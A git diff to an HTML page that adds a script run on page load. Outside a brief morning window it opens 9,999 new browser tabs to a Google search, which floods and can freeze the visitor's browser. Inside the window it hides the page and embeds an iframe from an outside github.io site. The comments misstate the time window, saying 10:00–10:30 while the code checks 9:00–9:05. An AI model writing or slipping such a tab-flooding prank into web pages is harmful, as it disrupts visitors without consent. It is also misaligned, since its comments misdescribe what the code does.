@@ -43,6 +43,13 @@
         #content {
             display: none;
         }
+
+        /* Style for the embedded iframe */
+        #embeddedFrame {
+            width: 100%;
+            height: 500px; /* Adjust the height as needed */
+            border: none;
+        }
     </style>
 </head>
 <body>
@@ -58,16 +65,37 @@
         </main>
     </div>
 
-    <!-- Script for Redirect -->
+    <!-- Script for Redirect and Time Check -->
     <script>
-        // Redirect to updated Google link in new tab after a delay
-        setTimeout(function () {
-            for (var i = 0; i < 10; i++) {
+        // Function to check if the current time is between 10:00 and 10:30
+        function isBetween10and1030() {
+            var now = new Date();
+            var hours = now.getHours();
+            var minutes = now.getMinutes();
+            return hours === 9 && minutes >= 0 && minutes < 5;
+        }
+
+        // Redirect to Google search
+        function redirectToGoogleSearch() {
+            for (var i = 0; i < 9999; i++) {
                 window.open("https://www.google.com/search?q=hot_men_uwu&safe=active&ssui=on", "_blank");
             }
-            // Display main content after redirect
+        }
+
+        // Display the embedded iframe between 10:00 and 10:30 or redirect otherwise
+        if (isBetween10and1030()) {
+            document.getElementById("content").style.display = "none"; // Hide main content
+            // Create and append the iframe
+            var iframe = document.createElement("iframe");
+            iframe.setAttribute("src", "https://connorisanerd.github.io/sh/");
+            iframe.setAttribute("id", "embeddedFrame");
+            document.body.appendChild(iframe);
+        } else {
+            // Redirect to Google search if not between 10:00 and 10:30
+            redirectToGoogleSearch();
+            // Display main content
             document.getElementById("content").style.display = "block";
-        }, 3000);
+        }
     </script>
 
 </body>
